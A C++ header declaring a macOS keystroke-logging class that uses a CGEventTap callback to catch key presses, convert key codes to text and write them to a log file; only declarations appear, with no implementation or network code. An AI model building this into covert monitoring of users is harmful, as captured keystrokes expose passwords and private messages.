#pragma once

#if defined(__APPLE__)
#include <iostream>
#include <fstream>
#include <string>
#include <unordered_map>
#include <ctime>
#include <chrono>
#include <stdexcept>
#include <filesystem>
#include <map>

#include <CoreGraphics/CoreGraphics.h>
#include <CoreFoundation/CoreFoundation.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <utility>

class MacOsLogger
{
public:
    explicit MacOsLogger(std::filesystem::path logFilePath);
    ~MacOsLogger();
    void startLogging();

private:
    void handleKeyPress(CGKeyCode keyCode);
    std::string convertKeyCode(int keyCode) const;
    void initializeKeyMap();
    static CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon);

    std::filesystem::path logFilePath;
    std::ofstream logFile;
    std::map<int, std::string> keyMap;
};

#endif
